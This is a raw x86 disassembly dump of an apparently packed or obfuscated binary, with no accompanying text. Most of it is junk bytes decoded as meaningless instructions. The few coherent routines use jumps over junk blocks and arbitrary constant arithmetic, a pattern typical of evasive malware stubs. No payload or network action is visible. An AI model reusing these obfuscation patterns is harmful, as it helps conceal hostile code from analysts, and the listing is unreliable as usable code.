  40caa1:	(bad)  
  40caa2:	pop    es
  40caa3:	xchg   ebp,eax
  40caa4:	xchg   esp,eax
  40caa5:	scas   eax,DWORD PTR es:[edi]
  40caa6:	dec    esp
  40caa7:	or     eax,0xa20018ec
  40caac:	ss call 0x6ff3:0x57964f0b
  40cab4:	ss adc al,0x1f
  40cab7:	fisubr WORD PTR [ebx+0x3eb30fb7]
  40cabd:	lock adc eax,0x6321a273
  40cac3:	jge    0x40ca69
  40cac5:	(bad)  
  40cac6:	jg     0x40ca94
  40cac8:	cs mov edx,0xa764a135
  40cace:	and    bh,BYTE PTR [ebx-0x28]
  40cad1:	xor    eax,0x6f1a116
  40cad6:	and    DWORD PTR [ecx],0x6190d91d
  40cadc:	xlat   BYTE PTR ds:[ebx]
  40cadd:	cmc    
  40cade:	or     ecx,DWORD PTR [ecx+0x49]
  40cae1:	imul   ebx,edi,0x6e
  40cae4:	and    BYTE PTR [eax+ebx*4],bh
  40cae7:	dec    esi
  40cae8:	(bad)  
  40cae9:	ss dec eax
  40caeb:	lahf   
  40caec:	(bad)  
  40caed:	mov    bh,0xd6
  40caef:	(bad)  
  40caf0:	mov    eax,0x3fed0f5d
  40caf5:	leave  
  40caf6:	int3   
  40caf7:	or     edx,DWORD PTR [ebp-0x61]
  40cafa:	sahf   
  40cafb:	fwait
  40cafc:	jmp    0x40cb0f
  40cafe:	retf   
  40caff:	in     eax,dx
  40cb00:	fdiv   DWORD PTR [edi+0x7807bef4]
  40cb06:	packuswb mm7,QWORD PTR [eax+0x21]
  40cb0a:	or     al,0xcd
  40cb0c:	out    0x5d,eax
  40cb0e:	out    dx,eax
  40cb0f:	iret   
  40cb10:	jnp    0x40cb40
  40cb12:	push   cs
  40cb13:	xchg   esp,eax
  40cb14:	dec    ebp
  40cb15:	mov    eax,es:0xae2f1080
  40cb1b:	int    0x8
  40cb1d:	in     al,dx
  40cb1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb1f:	pop    esi
  40cb20:	sbb    eax,0xf111c607
  40cb25:	push   ds
  40cb26:	mov    edx,0xa1e09012
  40cb2b:	cmp    eax,0x2bc00075
  40cb30:	ss int 0x45
  40cb33:	in     al,dx
  40cb34:	and    edi,DWORD PTR [ecx-0x42]
  40cb37:	dec    edi
  40cb38:	mov    ebp,0x6d3a77f1
  40cb3d:	push   ds
  40cb3e:	in     al,dx
  40cb3f:	mov    esi,0x5f6d7b1c
  40cb44:	mov    BYTE PTR [ecx+0x554c9ba0],dl
  40cb4a:	(bad)  [eax-0x2ec720e5]
  40cb50:	mov    dl,dl
  40cb52:	pop    edx
  40cb53:	je     0x40cb67
  40cb55:	pop    ecx
  40cb56:	out    0x4,al
  40cb58:	xor    eax,0xcaa6ff31
  40cb5d:	xchg   DWORD PTR [edi+0x47ea5da3],edx
  40cb63:	pop    esi
  40cb64:	xchg   ebp,eax
  40cb65:	aad    0xf0
  40cb67:	stos   BYTE PTR es:[edi],al
  40cb68:	test   eax,0xb90d07b3
  40cb6d:	mov    ss,WORD PTR [ecx-0x14d36dc9]
  40cb73:	aaa    
  40cb74:	hlt    
  40cb75:	loope  0x40cb2e
  40cb77:	int    0xd1
  40cb79:	mov    al,0xcc
  40cb7b:	jno    0x40cb57
  40cb7d:	dec    esp
  40cb7e:	inc    ebx
  40cb7f:	(bad)  
  40cb80:	xchg   bx,ax
  40cb82:	div    DWORD PTR [eax+0x8]
  40cb85:	jge    0x40cb49
  40cb87:	or     DWORD PTR [ecx+0x74c41175],ebx
  40cb8d:	nop
  40cb8e:	leave  
  40cb8f:	stos   BYTE PTR es:[edi],al
  40cb90:	ja     0x40cbce
  40cb92:	jno    0x40cb89
  40cb94:	(bad)  
  40cb95:	hlt    
  40cb96:	mov    ebp,0xc199914
  40cb9b:	mov    WORD PTR [eax-0x77],?
  40cb9e:	mov    al,0x6d
  40cba0:	and    BYTE PTR [ebp-0x7a4ee2],0x80
  40cba7:	hlt    
  40cba8:	cmp    edx,ecx
  40cbaa:	cmp    bh,BYTE PTR [ebx-0xb]
  40cbad:	cmp    DWORD PTR [ecx+0x15],edi
  40cbb0:	fs (bad) 
  40cbb2:	push   esi
  40cbb3:	cwde   
  40cbb4:	imul   esi,DWORD PTR [ebx-0x540e740e],0xe38c478
  40cbbe:	jo     0x40cb9d
  40cbc0:	xlat   BYTE PTR ds:[ebx]
  40cbc1:	mov    eax,0x71b3d338
  40cbc6:	jne    0x40cb78
  40cbc8:	adc    al,0x42
  40cbca:	pusha  
  40cbcb:	dec    edi
  40cbcc:	rcr    BYTE PTR [ebp-0x3e6082e2],cl
  40cbd2:	jne    0x40cbaa
  40cbd4:	clc    
  40cbd5:	sbb    DWORD PTR [edx],eax
  40cbd7:	pusha  
  40cbd8:	cmc    
  40cbd9:	out    0xfa,al
  40cbdb:	call   0x2183:0xfd51baf
  40cbe2:	add    BYTE PTR [eax],al
  40cbe4:	add    BYTE PTR [ebx+0x558be845],cl
  40cbea:	in     al,dx
  40cbeb:	shrd   eax,edx,0x2
  40cbef:	xor    eax,ecx
  40cbf1:	mov    ecx,DWORD PTR [ebp-0x18]
  40cbf4:	shr    edx,0x2
  40cbf7:	mov    edx,DWORD PTR [ebp-0x14]
  40cbfa:	xor    edx,edx
  40cbfc:	shl    ecx,0x1e
  40cbff:	or     eax,edx
  40cc01:	mov    ds:0x422620,eax
  40cc06:	pop    esi
  40cc07:	leave  
  40cc08:	ret    
  40cc09:	push   ebp
  40cc0a:	mov    ebp,esp
  40cc0c:	sub    esp,0x28
  40cc0f:	push   ebx
  40cc10:	push   esi
  40cc11:	push   edi
  40cc12:	mov    DWORD PTR [ebp-0x10],0x67e2
  40cc19:	mov    DWORD PTR [ebp-0x4],0x4726
  40cc20:	mov    DWORD PTR [ebp-0x8],0x580
  40cc27:	mov    DWORD PTR [ebp-0xc],0x5f3e
  40cc2e:	mov    DWORD PTR [ebp-0x28],0x3294
  40cc35:	mov    DWORD PTR [ebp-0x24],0x643
  40cc3c:	mov    DWORD PTR [ebp-0x20],0x2545
  40cc43:	mov    DWORD PTR [ebp-0x1c],0x43ab
  40cc4a:	xor    ebx,ebx
  40cc4c:	inc    ebx
  40cc4d:	mov    DWORD PTR [ebp-0x18],ebx
  40cc50:	mov    DWORD PTR [ebp-0x14],0x76b1
  40cc57:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc5a:	jmp    0x40cf1e
  40cc5f:	sub    edi,ebx
  40cc61:	sti    
  40cc62:	xchg   edi,eax
  40cc63:	sbb    dl,BYTE PTR [edi+0x7d189a1a]
  40cc69:	xor    DWORD PTR [eax-0x4f9432f4],0x1818edb9
  40cc73:	rcl    BYTE PTR [eax+ebx*1],cl
  40cc76:	sbb    BYTE PTR [eax+0x352f650c],dh
  40cc7c:	mov    eax,0x8edeeb27
  40cc81:	cld    
  40cc82:	jns    0x40cce5
  40cc84:	cli    
  40cc85:	idiv   DWORD PTR [edi-0x40]
  40cc88:	dec    ebx
  40cc89:	cmp    eax,0xe5e219a1
  40cc8e:	and    BYTE PTR ds:0x6d13182d,0x4b
  40cc95:	sti    
  40cc96:	mov    eax,ds:0xedd8422b
  40cc9b:	icebp  
  40cc9c:	pop    ss
  40cc9d:	(bad)  
  40cc9e:	in     al,0x18
  40cca0:	and    eax,0x7c652c16
  40cca5:	nop
  40cca6:	mov    eax,ds:0xe3c326b
  40ccab:	xor    ebx,ebp
  40ccad:	xor    BYTE PTR [esi-0x2c],0x4
  40ccb1:	adc    edx,DWORD PTR [esi]
  40ccb3:	lock fmul DWORD PTR [ecx-0x5fa0d6bd]
  40ccba:	cs retf 
  40ccbc:	pop    ebx
  40ccbd:	pop    ds
  40ccbe:	xlat   BYTE PTR ds:[ebx]
  40ccbf:	push   cs
  40ccc0:	add    eax,0x4f185321
  40ccc5:	stos   DWORD PTR es:[edi],eax
  40ccc6:	clc    
  40ccc7:	mov    cs,WORD PTR [edi-0x55]
  40ccca:	jns    0x40cd45
  40cccc:	dec    ecx
  40cccd:	mov    bl,0x20
  40cccf:	outs   dx,BYTE PTR ds:[esi]
  40ccd0:	fisttp QWORD PTR [esi+0x2745199c]
  40ccd6:	lds    esi,FWORD PTR [edx]
  40ccd8:	add    DWORD PTR [edi-0x3e],ebp
  40ccdb:	outs   dx,DWORD PTR ds:[esi]
  40ccdc:	add    al,al
  40ccde:	sbb    BYTE PTR [ebx+0x2a],bh
  40cce1:	aad    0xf5
  40cce3:	push   es
  40cce4:	pop    eax
  40cce5:	xchg   edi,eax
  40cce6:	xor    al,0x9c
  40cce8:	inc    eax
  40cce9:	push   ss
  40ccea:	push   ebp
  40cceb:	lods   eax,DWORD PTR ds:[esi]
  40ccec:	fisubr WORD PTR [eiz*4-0x47388422]
  40ccf3:	and    edi,DWORD PTR [edi-0x254a75f5]
  40ccf9:	add    bh,dl
  40ccfb:	mov    cl,0x5a
  40ccfd:	stc    
  40ccfe:	push   edi
  40ccff:	mov    esp,DWORD PTR [edx-0x34f88b04]
  40cd05:	(bad)  
  40cd06:	je     0x40cd7c
  40cd08:	psrlw  mm7,mm2
  40cd0b:	jbe    0x40cd0b
  40cd0d:	push   0x5b7f3f85
  40cd12:	mov    esi,0x1c12c26
  40cd17:	fnstenv [ebp+0x24]
  40cd1a:	outs   dx,DWORD PTR ds:[esi]
  40cd1b:	cld    
  40cd1c:	mov    ds:0x86a8ad2a,al
  40cd21:	and    BYTE PTR [ebp-0x25f1366f],ah
  40cd27:	xchg   dl,bl
  40cd29:	outs   dx,BYTE PTR ds:[esi]
  40cd2a:	test   BYTE PTR [edx],ah
  40cd2c:	pusha  
  40cd2d:	mov    eax,DWORD PTR [edi+eax*4-0x6f]
  40cd31:	or     DWORD PTR [edi-0x6518f6aa],esi
  40cd37:	inc    esp
  40cd38:	pop    eax
  40cd39:	mov    edi,?
  40cd3b:	pmaxsw mm5,QWORD PTR [edi]
  40cd3e:	jns    0x40cdac
  40cd40:	test   eax,0x4f53cab2
  40cd45:	push   es
  40cd46:	dec    ecx
  40cd47:	xor    dh,BYTE PTR [eax]
  40cd49:	repz js 0x40cd8e
  40cd4c:	mov    gs,WORD PTR [edi+eax*2+0x1]
  40cd50:	das    
  40cd51:	sub    BYTE PTR [ebx+edx*4],dh
  40cd54:	retf   
  40cd55:	fild   DWORD PTR ds:0xa9c7b9a4
  40cd5b:	cmp    eax,0x6d099f5d
  40cd60:	dec    eax
  40cd61:	test   al,0xc3
  40cd63:	mov    ah,dh
  40cd65:	or     dl,BYTE PTR [esi+0xb66720e]
  40cd6b:	in     al,dx
  40cd6c:	push   eax
  40cd6d:	je     0x40cdcd
  40cd6f:	pop    ebp
  40cd70:	popf   
  40cd71:	in     eax,dx
  40cd72:	aaa    
  40cd73:	out    0xb6,eax
  40cd75:	gs inc ecx
  40cd77:	push   ss
  40cd78:	stos   DWORD PTR es:[edi],eax
  40cd79:	out    dx,eax
  40cd7a:	stc    
  40cd7b:	pop    ebp
  40cd7c:	cs push eax
  40cd7e:	stos   BYTE PTR es:[edi],al
  40cd7f:	hlt    
  40cd80:	ficom  DWORD PTR [eax+0x15]
  40cd83:	lods   al,BYTE PTR ds:[esi]
  40cd84:	pop    ebx
  40cd85:	sbb    DWORD PTR [ebx-0xe11a07e],ebx
  40cd8b:	push   ebp
  40cd8c:	jmp    0x40cd5a
  40cd8e:	pop    esi
  40cd8f:	push   esi
  40cd90:	imul   edx,edx,0xffffffe7
  40cd93:	push   ss
  40cd94:	sbb    eax,0xfd61b98b
  40cd99:	adc    BYTE PTR [esi+0x37],0x1b
  40cd9d:	outs   dx,BYTE PTR ds:[esi]
  40cd9e:	sti    
  40cd9f:	mov    dh,0x9
  40cda1:	test   eax,eax
  40cda3:	mov    ah,0xf5
  40cda5:	jbe    0x40cd69
  40cda7:	xor    eax,0x149f42cc
  40cdac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdad:	jo     0x40ce26
  40cdaf:	xor    eax,0x8be95dc7
  40cdb4:	xchg   edi,eax
  40cdb5:	test   DWORD PTR [ebp-0x35],esi
  40cdb8:	sti    
  40cdb9:	xchg   DWORD PTR [ebp-0x519ccebc],edx
  40cdbf:	int    0x0
  40cdc1:	das    
  40cdc2:	call   0xd5d0:0x7ada5b0d
  40cdc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdca:	mov    bl,BYTE PTR [ecx+0x4f]
  40cdcd:	jg     0x40cd92
  40cdcf:	mov    eax,edi
  40cdd1:	js     0x40ce07
  40cdd3:	pop    edi
  40cdd4:	inc    ebp
  40cdd5:	aad    0xae
  40cdd7:	call   0xfa018c43
  40cddc:	xchg   DWORD PTR [edx-0x43],ebp
  40cddf:	scas   eax,DWORD PTR es:[edi]
  40cde0:	and    DWORD PTR [ebp-0x70],0xffffffd9
  40cde4:	sbb    al,0x5f
  40cde6:	pop    esi
  40cde7:	call   0xf163:0x392a8d68
  40cdee:	je     0x40cde7
  40cdf0:	pop    edi
  40cdf1:	imul   ebx,DWORD PTR [ecx-0x53],0xf975883d
  40cdf8:	mov    ds:0x7c977785,al
  40cdfd:	(bad)  
  40cdfe:	into   
  40cdff:	lods   eax,DWORD PTR cs:[esi]
  40ce01:	jb     0x40ce32
  40ce03:	jbe    0x40cdfd
  40ce05:	pop    ds
  40ce06:	inc    ebp
  40ce07:	mov    esi,0xfcab4b0e
  40ce0c:	jbe    0x40cdc6
  40ce0e:	iret   
  40ce0f:	mov    dl,0x9e
  40ce11:	bound  esp,QWORD PTR [eax-0x2e]
  40ce14:	arpl   dx,bp
  40ce16:	dec    ebp
  40ce17:	jmp    DWORD PTR [edi+ebx*8-0x32]
  40ce1b:	pusha  
  40ce1c:	and    al,0x69
  40ce1e:	xchg   esp,eax
  40ce1f:	outs   dx,BYTE PTR ds:[esi]
  40ce20:	adc    ah,ch
  40ce22:	(bad)  
  40ce23:	xchg   ebx,eax
  40ce24:	ja     0x40ce43
  40ce26:	mov    al,0xac
  40ce28:	or     eax,0x1ad3d90f
  40ce2d:	sbb    DWORD PTR [eax],ebp
  40ce2f:	dec    edx
  40ce30:	push   es
  40ce31:	xor    al,0xe
  40ce33:	jbe    0x40ce8a
  40ce35:	shl    BYTE PTR [esi-0x5522df1],cl
  40ce3b:	mov    eax,ds:0x1354974e
  40ce40:	push   ds
  40ce41:	pusha  
  40ce42:	out    0xe7,al
  40ce44:	xchg   edi,eax
  40ce45:	xchg   ebp,eax
  40ce46:	cmp    al,0xe6
  40ce48:	mov    edx,0xfc888752
  40ce4d:	not    DWORD PTR [ebp-0x5539a8c8]
  40ce53:	lahf   
  40ce54:	cs in  eax,0x1a
  40ce57:	or     cl,BYTE PTR [eax+0x5d]
  40ce5a:	fisttp QWORD PTR [eax]
  40ce5c:	mov    al,0x84
  40ce5e:	rcr    BYTE PTR [ebx],1
  40ce60:	lahf   
  40ce61:	push   eax
  40ce62:	mov    bl,0xe6
  40ce64:	push   ebp
  40ce65:	popa   
  40ce66:	sbb    DWORD PTR [edi],ecx
  40ce68:	dec    ecx
  40ce69:	aaa    
  40ce6a:	dec    eax
  40ce6b:	xor    edi,DWORD PTR [eax+0x3a242e14]
  40ce71:	lods   al,BYTE PTR es:[esi]
  40ce73:	and    cl,ah
  40ce75:	add    BYTE PTR fs:[ecx],dh
  40ce78:	mov    cl,0x75
  40ce7a:	cmp    al,0x1
  40ce7c:	push   0x5c37940a
  40ce81:	in     eax,dx
  40ce82:	stos   DWORD PTR es:[edi],eax
  40ce83:	shr    BYTE PTR [ebp+0x69],0xef
  40ce87:	xor    al,0x26
  40ce89:	or     cl,BYTE PTR [edx-0x7b88713e]
  40ce8f:	jae    0x40cec1
  40ce91:	lahf   
  40ce92:	pop    ebx
  40ce93:	into   
  40ce94:	sub    al,0x82
  40ce96:	stos   BYTE PTR es:[edi],al
  40ce97:	ror    DWORD PTR [esp+eiz*2+0x423df2b7],cl
  40ce9e:	scas   al,BYTE PTR es:[edi]
  40ce9f:	sahf   
  40cea0:	mov    bh,0x7e
  40cea2:	xchg   esp,eax
  40cea3:	sub    DWORD PTR [ecx+0x4d9058dd],0xffffffc6
  40ceaa:	scas   eax,DWORD PTR es:[edi]
  40ceab:	rcl    BYTE PTR [edx],cl
  40cead:	push   ds
  40ceae:	pop    ss
  40ceaf:	fs sahf 
  40ceb1:	(bad)  
  40ceb2:	lds    eax,FWORD PTR [ecx+0x3b]
  40ceb5:	jg     0x40ce8e
  40ceb7:	in     al,0x69
  40ceb9:	or     edi,DWORD PTR [ecx+0x5a]
  40cebc:	out    0x24,eax
  40cebe:	mov    cl,0x30
  40cec0:	push   0x61476bc3
  40cec5:	cld    
  40cec6:	aaa    
  40cec7:	ss loopne 0x40cedf
  40ceca:	push   eax
  40cecb:	(bad)  
  40cecc:	pop    eax
  40cecd:	xchg   esp,eax
  40cece:	(bad)
  40ced1:	js     0x40cf4c
  40ced3:	and    eax,0xc11c69ff
  40ced8:	sub    cl,BYTE PTR [edx+0x4bb828c0]
  40cede:	and    esi,ecx
  40cee0:	jle    0x40cf27
  40cee2:	push   edi
  40cee3:	push   ds
  40cee4:	cmp    al,0x90
  40cee6:	xchg   ecx,eax
  40cee7:	jg     0x40ced4
  40cee9:	leave  
  40ceea:	(bad)  
  40ceeb:	mov    eax,ds:0x972ed23f
  40cef0:	mov    al,0x39
  40cef2:	aas    
  40cef3:	xlat   BYTE PTR ds:[ebx]
  40cef4:	pop    edx
  40cef5:	cld    
  40cef6:	popf   
  40cef7:	jmp    0x40cede
  40cef9:	inc    ecx
  40cefa:	mov    eax,ds:0x5f08593d
  40ceff:	jnp    0x40ced9
  40cf01:	add    ah,BYTE PTR [edx+edi*4-0x3e04a22]
  40cf08:	push   0xffffff80
  40cf0a:	add    DWORD PTR ds:0x484672c2,edx
  40cf10:	das    
  40cf11:	pop    ecx
  40cf12:	das    
  40cf13:	lahf   
  40cf14:	pushf  
  40cf15:	inc    esi
  40cf16:	call   0x5a71:0xa9281220
  40cf1d:	das    
  40cf1e:	mov    eax,DWORD PTR [ebp-0x4]
  40cf21:	sub    ecx,eax
  40cf23:	add    ecx,DWORD PTR [ebp-0xc]
  40cf26:	add    ecx,DWORD PTR [ebp-0x10]
  40cf29:	imul   ecx,ecx,0x1f80
  40cf2f:	add    ecx,0x727e
  40cf35:	xor    ecx,0x106c92f2
  40cf3b:	mov    DWORD PTR [ebp-0x8],0x113c
  40cf42:	mov    DWORD PTR [ebp-0xc],0x3d61
  40cf49:	mov    DWORD PTR [ebp-0x10],0x16e9
  40cf50:	mov    DWORD PTR [ebp-0x4],0x21aa
  40cf57:	mov    eax,DWORD PTR [ebp-0x10]
  40cf5a:	or     eax,0x3611
  40cf5f:	add    eax,DWORD PTR [ebp-0xc]
  40cf62:	mov    edx,DWORD PTR [ebp-0x8]
  40cf65:	and    eax,edx
  40cf67:	mov    edx,ecx
  40cf69:	sub    edx,eax
  40cf6b:	mov    eax,DWORD PTR [ebp-0x4]
  40cf6e:	mov    esi,DWORD PTR ds:0x422518
  40cf74:	mov    esi,DWORD PTR [esi+0x1cc]
  40cf7a:	add    eax,0x6772
  40cf7f:	or     eax,0x1f24
  40cf84:	sub    eax,0x7046
  40cf89:	xor    eax,0x497a
  40cf8e:	sub    esi,eax
  40cf90:	mov    eax,DWORD PTR [ebp+0x8]
  40cf93:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  40cf9a:	jmp    0x40d25e
  40cf9f:	nop
  40cfa0:	xchg   ebx,eax
  40cfa1:	retf   
  40cfa2:	ja     0x40cf6e
  40cfa4:	das    
  40cfa5:	sub    al,0x6a
  40cfa7:	sbb    DWORD PTR [esi+0x3d9dbcd3],esi
  40cfad:	cmp    DWORD PTR [edx+esi*2-0x18],0x18
  40cfb2:	sbb    dl,dl
  40cfb4:	adc    al,0x18
  40cfb6:	sbb    BYTE PTR [edi-0x33],ch
  40cfb9:	ret    
  40cfba:	fidiv  WORD PTR ds:0xf948f949
  40cfc0:	mov    ds:0x9ed195c0,al
  40cfc5:	dec    eax
  40cfc6:	call   0xf070:0x7124fc3c
  40cfcd:	jle    0x40cf97
  40cfcf:	aad    0x55
  40cfd1:	fsub   DWORD PTR [ebx+0x797d12e8]
  40cfd7:	sbb    DWORD PTR [ebx+edi*4-0x1980a25],0x710b2079
  40cfe2:	push   ebp
  40cfe3:	fcom   QWORD PTR [edi]
  40cfe5:	sub    al,0xcd
  40cfe7:	loope  0x40cf73
  40cfe9:	retf   0x5f72
  40cfec:	push   esi
  40cfed:	xor    cl,BYTE PTR [edi-0x7e]
  40cff0:	cmp    al,BYTE PTR [esi-0x34]
  40cff3:	dec    edi
  40cff4:	sbb    BYTE PTR [edx+edi*1-0x2b],cl
  40cff8:	xor    esp,DWORD PTR [ebx+0x12]
  40cffb:	jnp    0x40cfce
  40cffd:	jnp    0x40d042
  40cfff:	mov    esp,0x5ea2a515
  40d004:	or     al,0x38
  40d006:	lea    ebp,[ebx+eiz*2]
  40d009:	cmp    ah,BYTE PTR [esi+0x27f140c2]
  40d00f:	add    bl,dh
  40d011:	jmp    0x8833:0x4333e851
  40d018:	lds    edi,FWORD PTR [ecx]
  40d01a:	int    0xe0
  40d01c:	mov    dh,0xdd
  40d01e:	sti    
  40d01f:	and    al,0xcb
  40d021:	cmc    
  40d022:	aaa    
  40d023:	fst    DWORD PTR [eax]
  40d025:	inc    ecx
  40d026:	jle    0x40d08c
  40d028:	bnd jbe 0x40cfef
  40d02b:	scas   al,BYTE PTR es:[edi]
  40d02c:	inc    ebp
  40d02d:	xchg   ecx,eax
  40d02e:	jb     0x40cfc4
  40d030:	push   edi
  40d031:	or     al,0x8f
  40d033:	xor    al,0x83
  40d035:	loop   0x40d084
  40d037:	(bad)  
  40d038:	dec    esp
  40d039:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d03a:	add    DWORD PTR ds:0xd6b275ec,ebx
  40d040:	ret    
  40d041:	std    
  40d042:	push   edi
  40d043:	dec    eax
  40d044:	xchg   edx,eax
  40d045:	fnstcw WORD PTR [eax]
  40d047:	out    0x87,eax
  40d049:	sub    ah,ch
  40d04b:	add    al,0xd9
  40d04d:	sbb    edi,DWORD PTR [esi]
  40d04f:	inc    esi
  40d050:	sbb    DWORD PTR [esi+ebp*4-0x1b],esi
  40d054:	add    esp,DWORD PTR [esi+0x41]
  40d057:	push   ecx
  40d058:	loope  0x40d0c1
  40d05a:	mov    BYTE PTR [ebx-0x80],dl
  40d05d:	inc    ebp
  40d05e:	fmul   DWORD PTR [esi+0x63]
  40d061:	cmp    ah,BYTE PTR [ebx+ecx*4]
  40d064:	cmp    al,0xc0
  40d066:	sub    al,0x34
  40d068:	lds    eax,FWORD PTR [edx+edi*8-0x78]
  40d06c:	jmp    0x9b31:0xf2ace4b5
  40d073:	gs push es
  40d075:	mov    bh,0x23
  40d077:	sbb    al,0x6
  40d079:	mov    WORD PTR [eax],?
  40d07b:	xchg   edi,eax
  40d07c:	fcom   DWORD PTR cs:[ebx+eax*1+0x46]
  40d081:	mov    dl,0xb7
  40d083:	xor    bh,BYTE PTR [ebp-0x46]
  40d086:	sar    BYTE PTR [ebx+0x48],0xc5
  40d08a:	add    DWORD PTR [ecx],0xc12ebb2b
  40d090:	js     0x40d0f2
  40d092:	arpl   WORD PTR [eax+0x32],di
  40d095:	dec    eax
  40d096:	fnstcw WORD PTR [edi+0x6f]
  40d099:	dec    eax
  40d09a:	dec    ebx
  40d09b:	(bad)  
  40d09d:	hlt    
  40d09e:	retf   0x7687
  40d0a1:	add    al,0x61
  40d0a3:	mov    al,ds:0xf0270d3b
  40d0a8:	dec    esp
  40d0a9:	mov    ebx,0x5c266e60
  40d0ae:	pop    eax
  40d0af:	mov    al,0xf6
  40d0b1:	lods   al,BYTE PTR ds:[esi]
  40d0b2:	push   ebp
  40d0b3:	and    BYTE PTR [ecx+0x7d],dh
  40d0b6:	jmp    0x40d0b2
  40d0b8:	in     al,0x84
  40d0ba:	les    ecx,FWORD PTR [esi+esi*8]
  40d0bd:	jmp    0x7dbe1e2a
  40d0c2:	xchg   ecx,eax
  40d0c3:	mov    WORD PTR [ebx],gs
  40d0c5:	jge    0x40d096
  40d0c7:	bound  edx,QWORD PTR [ebx-0x5737c0fc]
  40d0cd:	(bad)  
  40d0ce:	out    0xf6,eax
  40d0d0:	mov    ch,0xfb
  40d0d2:	and    al,0x9
  40d0d4:	sub    DWORD PTR [ebp+0x749f9299],ecx
  40d0da:	cmp    eax,0xba6874c7
  40d0df:	or     ebx,DWORD PTR [ebx+0x6a]
  40d0e2:	imul   ebp,eax,0xa02e430b
  40d0e8:	cmp    DWORD PTR [ecx+0x24917908],ebx
  40d0ee:	leave  
  40d0ef:	inc    esi
  40d0f0:	outs   dx,DWORD PTR ds:[esi]
  40d0f1:	pop    esi
  40d0f2:	push   edi
  40d0f3:	std    
  40d0f4:	fisubr WORD PTR [ecx]
  40d0f6:	or     BYTE PTR [ebx+0x41],ch
  40d0f9:	mov    esi,0x4adc70e0
  40d0fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0ff:	sub    BYTE PTR [ebx+0x30],al
  40d102:	push   ebx
  40d103:	aas    
  40d104:	idiv   DWORD PTR [edi+0x4f]
  40d107:	(bad)  
  40d109:	imul   ebx,DWORD PTR [eax],0x11
  40d10c:	(bad)  
  40d10d:	push   esi
  40d10e:	retf   
  40d10f:	dec    edx
  40d110:	dec    ecx
  40d111:	fs xor esi,ebp
  40d114:	sub    DWORD PTR [edx+0x1e],esi
  40d117:	stc    
  40d118:	out    0x5a,al
  40d11a:	xchg   esp,eax
  40d11b:	sbb    ebp,ebx
  40d11d:	fld    DWORD PTR [ecx+0x21896618]
  40d123:	jl     0x40d193
  40d125:	xchg   ebp,eax
  40d126:	dec    ebp
  40d127:	inc    edx
  40d128:	dec    ebx
  40d129:	dec    edx
  40d12a:	push   0xfffffffb
  40d12c:	fs je  0x40d15d
  40d12f:	pop    ecx
  40d130:	push   ebp
  40d131:	or     esp,edi
  40d133:	sbb    al,0x9c
  40d135:	(bad)  
  40d137:	js     0x40d17d
  40d139:	in     al,0xf9
  40d13b:	cmp    eax,0xd3a706f9
  40d140:	push   edi
  40d141:	cmc    
  40d142:	push   edx
  40d143:	dec    edi
  40d144:	rcl    bl,0xf0
  40d147:	mov    ch,0x0
  40d149:	add    al,0xbd
  40d14b:	pop    edx
  40d14c:	fprem  
  40d14e:	loop   0x40d1c6
  40d150:	cdq    
  40d151:	rol    DWORD PTR [edx],1
  40d153:	mov    cl,0x63
  40d155:	cmc    
  40d156:	push   0x3e008d11
  40d15b:	xchg   ecx,eax
  40d15c:	outs   dx,DWORD PTR ds:[esi]
  40d15d:	into   
  40d15e:	mov    bl,0xdc
  40d160:	shr    BYTE PTR [edi+0x606eb334],0xfc
  40d167:	int    0x5c
  40d169:	sbb    DWORD PTR [esi-0x25aacfd0],ebx
  40d16f:	lds    eax,FWORD PTR [ecx]
  40d171:	xchg   edi,eax
  40d172:	popf   
  40d173:	(bad)  
  40d174:	int3   
  40d175:	sbb    esp,DWORD PTR [ebp-0x3e]
  40d178:	sbb    esi,DWORD PTR [edi+0x78]
  40d17b:	je     0x40d11f
  40d17d:	lds    ebx,FWORD PTR [ecx+0xe]
  40d180:	aaa    
  40d181:	sbb    bl,BYTE PTR ds:0xb0f3d534
  40d187:	(bad)  
  40d188:	sbb    edx,DWORD PTR [eax+eax*1]
  40d18b:	mov    bl,dl
  40d18d:	shl    BYTE PTR [ebx+0x528efa1c],1
  40d193:	in     eax,dx
  40d194:	dec    ecx
  40d195:	stos   BYTE PTR es:[edi],al
  40d196:	xchg   esi,eax
  40d197:	sub    BYTE PTR [eax+edi*2-0x756c71e8],0xb1
  40d19f:	push   ebx
  40d1a0:	mov    bl,0x93
  40d1a2:	fst    QWORD PTR [edi+0x58a82241]
  40d1a8:	lds    ecx,FWORD PTR ss:0xf85279d9
  40d1af:	lods   al,BYTE PTR ds:[esi]
  40d1b0:	or     ch,BYTE PTR [eax+edx*2+0x68]
  40d1b4:	in     al,0x29
  40d1b6:	dec    eax
  40d1b7:	inc    eax
  40d1b8:	cmp    eax,0x7b9c3f06
  40d1bd:	test   dh,bh
  40d1bf:	adc    BYTE PTR [edx],dh
  40d1c1:	pop    eax
  40d1c2:	mov    dh,0x28
  40d1c4:	repnz mov ecx,0xad9b2a15
  40d1ca:	stos   DWORD PTR es:[edi],eax
  40d1cb:	fwait
  40d1cc:	(bad)  
  40d1cd:	xchg   esp,eax
  40d1ce:	ds sbb eax,0xa8901513
  40d1d4:	jns    0x40d17c
  40d1d6:	mov    al,ds:0x55ddc59f
  40d1db:	mov    eax,ecx
  40d1dd:	jge    0x40d250
  40d1df:	sub    DWORD PTR [ecx],edx
  40d1e1:	aad    0x1c
  40d1e3:	mov    ds:0xcb0d096f,eax
  40d1e8:	shl    BYTE PTR [edi+ebx*1],1
  40d1eb:	out    dx,eax
  40d1ec:	lahf   
  40d1ed:	into   
  40d1ee:	jnp    0x40d257
  40d1f0:	loopne 0x40d24f
  40d1f2:	cmp    DWORD PTR [ecx-0x39],edi
  40d1f5:	std    
  40d1f6:	sub    edi,ecx
  40d1f8:	inc    eax
  40d1f9:	scas   eax,DWORD PTR es:[edi]
  40d1fa:	cwde   
  40d1fb:	mov    edi,0x573c9634
  40d200:	std    
  40d201:	xor    DWORD PTR [ebx],esi
  40d203:	push   0x62b5163f
  40d208:	sub    DWORD PTR [edx-0x5a],ebp
  40d20b:	in     al,0x7f
  40d20d:	jecxz  0x40d272
  40d20f:	scas   al,BYTE PTR es:[edi]
  40d210:	rcr    esp,1
  40d212:	cmp    al,0xd8
  40d214:	mov    ebx,0x9d10a50e
